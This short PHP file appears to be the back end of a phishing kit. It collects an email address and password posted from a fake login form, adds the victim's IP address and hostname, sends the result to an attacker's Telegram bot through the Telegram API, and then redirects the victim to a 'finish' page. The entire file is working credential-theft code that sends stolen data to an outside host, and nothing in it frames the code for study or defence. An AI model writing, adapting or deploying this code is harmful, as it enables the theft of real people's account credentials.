<?php
session_start();
include "../config.php";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "📧 𝖤𝗆𝖺𝗂𝗅 𝖠𝖼𝖼𝖾𝗌𝗌 📧\n";
$msg .= "\n";
$msg .= "Email: ".$_POST['j_email']."\n";
$msg .= "Password: ".$_POST['j_password1']."\n";
$msg .= "\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName : ".$hostname."\n";


file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );


header("Location: finish.php");  	  
?>


